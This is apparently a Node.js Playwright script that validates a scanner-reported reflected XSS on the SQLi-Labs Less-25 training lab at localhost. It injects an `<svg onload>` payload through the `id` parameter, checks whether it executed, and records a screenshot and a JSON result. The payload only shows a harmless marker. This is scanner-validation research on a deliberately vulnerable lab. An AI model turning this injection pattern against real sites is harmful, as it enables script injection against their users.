/**
 * Confirm the Wapiti-only finding on SQLi-Labs Less-25: the `id` value is
 * reflected into the hint block without HTML encoding.  The marker is harmless.
 */
const { chromium } = require('playwright-core');
const fs = require('fs');
const path = require('path');

const CHROME = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe';
const ROOT = path.resolve(__dirname, '..', '..');
const OUT = path.join(ROOT, 'optional2', 'case_studies');
const marker = 'WAP_LESS25_XSS';
const payload = `<svg onload="window.__wp4xss='${marker}';var d=document.createElement('div');d.style.background='lime';d.style.fontSize='28px';d.textContent='${marker}';document.body.prepend(d)">`;
const url = `http://127.0.0.1:9081/Less-25/index.php?id=${encodeURIComponent(payload)}`;

(async () => {
  const browser = await chromium.launch({ executablePath: CHROME, headless: true, args: ['--no-sandbox'] });
  const page = await browser.newPage({ viewport: { width: 1280, height: 900 } });
  const errors = [];
  page.on('pageerror', (err) => errors.push(String(err)));
  await page.goto(url, { waitUntil: 'commit', timeout: 15000 });
  await page.waitForTimeout(800);
  const executed = await page.evaluate((m) => window.__wp4xss === m, marker);
  const html = await page.content();
  await page.screenshot({ path: path.join(OUT, 'less25_xss_browser.png'), fullPage: false });
  fs.writeFileSync(path.join(OUT, 'less25_xss_browser.json'), JSON.stringify({
    sample_id: 'SQLI-003',
    scope_note: 'tool-only additional reflected XSS, outside the 14-parent target label',
    url,
    payload,
    executed,
    marker_in_raw_html: html.includes(payload),
    page_errors: errors,
    screenshot: 'optional2/case_studies/less25_xss_browser.png',
    recorded_at: new Date().toISOString(),
  }, null, 2));
  console.log(JSON.stringify({ executed, marker_in_raw_html: html.includes(payload), errors }));
  await browser.close();
})().catch((err) => { console.error(err); process.exit(1); });
